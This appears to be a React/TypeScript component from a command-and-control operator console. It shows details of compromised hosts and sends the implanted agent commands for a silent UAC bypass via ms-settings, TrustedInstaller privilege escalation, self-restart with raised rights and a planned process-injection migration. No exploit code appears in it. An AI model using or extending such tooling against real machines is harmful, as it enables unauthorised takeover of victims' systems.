// 主机信息面板(真实对接 ):
//   基础 KV 来自共享会话缓存(['sessions'], 真实列表数据);
//   深度信息挂载时发一次 GetSystemInfo(Agent 往返): os_name/os_version/architecture/
//   cpu_brand/cpu_cores/total_ram_bytes, 可手动刷新; 离线会话不发命令。
// 操作按钮: 提权 = Elevate(check/uac_ms_settings/trustedinstaller + self);
//   退出 = ExitProgram(危险确认); 迁移 = 待接入(需 SHC 二进制体流程, 老前端亦未接)。
import { useState } from 'react'
import { useQuery } from '@tanstack/react-query'
import {
  Cpu,
  HardDrive,
  MemoryStick,
  Monitor,
  Network,
  RefreshCw,
  Shield,
  ShieldCheck,
  Terminal,
} from 'lucide-react'
import { toast } from 'sonner'
import { listSessions, sendCommand } from '@/lib/cleat-api'
import { useCanWrite } from '@/hooks/use-can-write'
import { cn } from '@/lib/utils'
import { Badge } from '@/components/ui/badge'
import { Button } from '@/components/ui/button'
import { Card, CardContent } from '@/components/ui/card'
import { Checkbox } from '@/components/ui/checkbox'
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
} from '@/components/ui/dialog'
import { Label } from '@/components/ui/label'
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select'
import { Skeleton } from '@/components/ui/skeleton'
import { ConfirmDialog } from '@/components/confirm-dialog'

interface DeepInfo {
  hostname: string
  os_name: string
  os_version: string
  architecture: string
  total_ram_bytes: number
  cpu_cores: number
  cpu_brand: string
  local_ip: string
  pid: number
  process_name: string
  privilege: string
}

type ElevateMethod = 'check' | 'uac_ms_settings' | 'trustedinstaller'

const ELEVATE_METHODS: { value: ElevateMethod; label: string }[] = [
  { value: 'check', label: '检查当前权限状态（check）' },
  { value: 'uac_ms_settings', label: 'UAC 静默提权（uac_ms_settings）' },
  { value: 'trustedinstaller', label: 'TrustedInstaller 提权（trustedinstaller）' },
]

function fmtBytes(n: number): string {
  if (!n || n <= 0) return '—'
  const gb = n / 1024 / 1024 / 1024
  if (gb >= 1) return `${gb.toFixed(1)} GB`
  const mb = n / 1024 / 1024
  return `${mb.toFixed(0)} MB`
}

function KV({ icon: Icon, label, value, mono }: { icon: React.ElementType; label: string; value: string; mono?: boolean }) {
  return (
    <div className='flex items-center gap-3 rounded-lg border p-3'>
      <div className='flex size-8 shrink-0 items-center justify-center rounded-md bg-muted'>
        <Icon className='size-4 text-muted-foreground' />
      </div>
      <div className='min-w-0'>
        <p className='text-xs text-muted-foreground'>{label}</p>
        <p className={cn('truncate text-sm font-medium', mono && 'font-mono')} title={value}>
          {value || '—'}
        </p>
      </div>
    </div>
  )
}

export function HostInfoPanel({ sessionId }: { sessionId: number }) {
  const canWrite = useCanWrite()
  const { data, isLoading } = useQuery({
    queryKey: ['sessions'],
    queryFn: listSessions,
    refetchInterval: 3000,
  })
  const s = (data?.sessions ?? []).find((x) => x.id === sessionId)
  const online = !!s?.online

  // ---- 提权/退出 状态 ----
  const [elevateOpen, setElevateOpen] = useState(false)
  const [elevateMethod, setElevateMethod] = useState<ElevateMethod>('check')
  const [elevateSelf, setElevateSelf] = useState(false)
  const [elevateBusy, setElevateBusy] = useState(false)
  const [exitOpen, setExitOpen] = useState(false)
  const [exitBusy, setExitBusy] = useState(false)

  // 深度信息: GetSystemInfo(离线不发, 等会话上线后自动重试)
  const deep = useQuery({
    queryKey: ['sysinfo', sessionId],
    queryFn: async (): Promise<DeepInfo> => {
      const resp = await sendCommand<Record<string, unknown>>(sessionId, 'GetSystemInfo')
      const d = (resp.data ?? resp) as Record<string, unknown>
      return {
        hostname: String(d.hostname ?? ''),
        os_name: String(d.os_name ?? ''),
        os_version: String(d.os_version ?? ''),
        architecture: String(d.architecture ?? ''),
        total_ram_bytes: Number(d.total_ram_bytes ?? 0),
        cpu_cores: Number(d.cpu_cores ?? 0),
        cpu_brand: String(d.cpu_brand ?? ''),
        local_ip: String(d.local_ip ?? ''),
        pid: Number(d.pid ?? 0),
        process_name: String(d.process_name ?? ''),
        privilege: String(d.privilege ?? ''),
      }
    },
    enabled: online,
    staleTime: 60_000,
    refetchOnWindowFocus: false,
    retry: false,
  })

  const osLine = deep.data
    ? [deep.data.os_name, deep.data.os_version].filter(Boolean).join(' ') || s?.os || ''
    : s?.os || ''

  const doElevate = async () => {
    setElevateBusy(true)
    try {
      const params: Record<string, unknown> = { method: elevateMethod }
      if (elevateSelf && elevateMethod !== 'check') params.self = true
      const resp = await sendCommand<Record<string, unknown>>(sessionId, 'Elevate', params)
      const d = (resp.data ?? resp) as Record<string, unknown>
      const summary = JSON.stringify(d)
      toast.success('提权命令已执行', {
        description: summary && summary !== '{}' ? summary.slice(0, 300) : undefined,
      })
      setElevateOpen(false)
    } catch (e) {
      toast.error(`提权失败: ${(e as Error).message}`)
    } finally {
      setElevateBusy(false)
    }
  }

  const doExit = async () => {
    setExitBusy(true)
    try {
      await sendCommand(sessionId, 'ExitProgram')
      toast.success('已下发退出命令 —— 会话即将断开')
      setExitOpen(false)
    } catch (e) {
      toast.error(`退出失败: ${(e as Error).message}`)
    } finally {
      setExitBusy(false)
    }
  }

  if (isLoading || !s) {
    return (
      <div className='grid gap-3 p-4 sm:grid-cols-2 lg:grid-cols-3'>
        {Array.from({ length: 9 }).map((_, i) => (
          <Skeleton key={i} className='h-16 w-full' />
        ))}
      </div>
    )
  }

  return (
    <div className='h-full overflow-y-auto p-4'>
      <div className='mb-3 flex flex-wrap items-center gap-2'>
        <h3 className='text-lg font-bold'>{s.hostname}</h3>
        <Badge variant='outline' className='rounded-sm font-mono text-[10px]'>
          {(deep.data?.privilege || s.privilege || '—').toUpperCase()}
        </Badge>
        <span className={s.online ? 'text-xs text-emerald-500' : 'text-xs text-muted-foreground'}>
          {s.online ? '● 在线' : '○ 离线'}
        </span>
        <div className='ms-auto flex gap-2'>
          {/* 深度信息刷新(离线时置灰) */}
          <Button
            size='sm'
            variant='ghost'
            className='h-7 gap-1 px-2 text-xs'
            disabled={!online || deep.isFetching}
            title='重新获取 GetSystemInfo'
            onClick={() => void deep.refetch()}
          >
            <RefreshCw className={cn('size-3.5', deep.isFetching && 'animate-spin')} />
            刷新信息
          </Button>
          {/* 对抗模块: Elevate / 注入迁移 / ExitProgram */}
          <Button
            size='sm'
            variant='outline'
            className='h-7 text-xs'
            disabled={!online || !canWrite}
            title={!canWrite ? '当前角色无下发权限' : undefined}
            onClick={() => setElevateOpen(true)}
          >
            <ShieldCheck className='size-3.5' />
            提权
          </Button>
          <Button
            size='sm'
            variant='outline'
            className='h-7 text-xs'
            disabled={!online || !canWrite}
            onClick={() => toast('待接入：进程注入迁移（需 SHC 二进制体流程，排队中）')}
          >
            <Terminal className='size-3.5' />
            迁移
          </Button>
          <Button
            size='sm'
            variant='destructive'
            className='h-7 text-xs'
            disabled={!online || !canWrite}
            title={!canWrite ? '当前角色无下发权限' : undefined}
            onClick={() => setExitOpen(true)}
          >
            退出
          </Button>
        </div>
      </div>

      <div className='grid gap-3 sm:grid-cols-2 lg:grid-cols-3'>
        <KV icon={Monitor} label='主机名' value={deep.data?.hostname || s.hostname} />
        <KV icon={Monitor} label='操作系统' value={osLine} />
        <KV icon={Cpu} label='架构' value={deep.data?.architecture || ''} />
        <KV
          icon={Cpu}
          label='CPU'
          value={
            deep.data?.cpu_brand
              ? `${deep.data.cpu_brand}${deep.data.cpu_cores ? `（${deep.data.cpu_cores} 核）` : ''}`
              : s.cpu || ''
          }
        />
        <KV icon={MemoryStick} label='内存' value={deep.data?.total_ram_bytes ? fmtBytes(deep.data.total_ram_bytes) : s.memory || ''} />
        <KV icon={Network} label='远程地址' value={s.remote_ip} />
        <KV icon={Network} label='本地地址' value={deep.data?.local_ip || s.local_ip} />
        <KV
          icon={Terminal}
          label='进程'
          value={`${deep.data?.process_name || s.process_name} (${deep.data?.pid || s.pid})`}
          mono
        />
        <KV icon={Shield} label='权限' value={deep.data?.privilege || s.privilege} />
        <KV icon={Network} label='通道' value={s.transport} />
        <KV icon={HardDrive} label='最近心跳' value={new Date(s.last_seen).toLocaleString()} />
      </div>

      {!online && (
        <Card className='mt-4 border-dashed'>
          <CardContent className='py-3 text-xs text-muted-foreground'>
            会话离线 —— 深度信息（GetSystemInfo）将在会话上线后自动获取。
          </CardContent>
        </Card>
      )}

      {/* 提权对话框: 方式选择 + 自提权(以提升权限重启 Agent 自身) */}
      <Dialog open={elevateOpen} onOpenChange={setElevateOpen}>
        <DialogContent className='sm:max-w-md'>
          <DialogHeader>
            <DialogTitle>提权 · {s.hostname}</DialogTitle>
            <DialogDescription>
              向 Agent 下发 Elevate 命令（README 语义：check 只读检查，另两种为实际提权路径）
            </DialogDescription>
          </DialogHeader>
          <div className='space-y-4'>
            <div className='space-y-2'>
              <Label>提权方式</Label>
              <Select value={elevateMethod} onValueChange={(v) => setElevateMethod(v as ElevateMethod)}>
                <SelectTrigger className='w-full'>
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  {ELEVATE_METHODS.map((m) => (
                    <SelectItem key={m.value} value={m.value}>
                      {m.label}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>
            <label className='flex items-center gap-2 text-sm'>
              <Checkbox
                checked={elevateSelf}
                onCheckedChange={(v) => setElevateSelf(v === true)}
                disabled={elevateMethod === 'check'}
              />
              提权后以高权限重启 Agent 自身（self=true）
            </label>
            {elevateMethod === 'check' && (
              <p className='text-xs text-muted-foreground'>check 模式仅回读当前权限状态，不触发提权动作。</p>
            )}
          </div>
          <DialogFooter>
            <Button variant='outline' onClick={() => setElevateOpen(false)} disabled={elevateBusy}>
              取消
            </Button>
            <Button onClick={() => void doElevate()} disabled={elevateBusy}>
              {elevateBusy ? '执行中…' : '执行'}
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* 退出确认: 不可撤销(会话断开) */}
      <ConfirmDialog
        open={exitOpen}
        onOpenChange={setExitOpen}
        title={`退出会话 · ${s.hostname}`}
        desc='将向 Agent 下发 ExitProgram（进程退出, 会话断开）。此操作不可撤销。'
        destructive
        cancelBtnText='取消'
        confirmText={exitBusy ? '执行中…' : '确认退出'}
        isLoading={exitBusy}
        handleConfirm={() => void doExit()}
      />
    </div>
  )
}
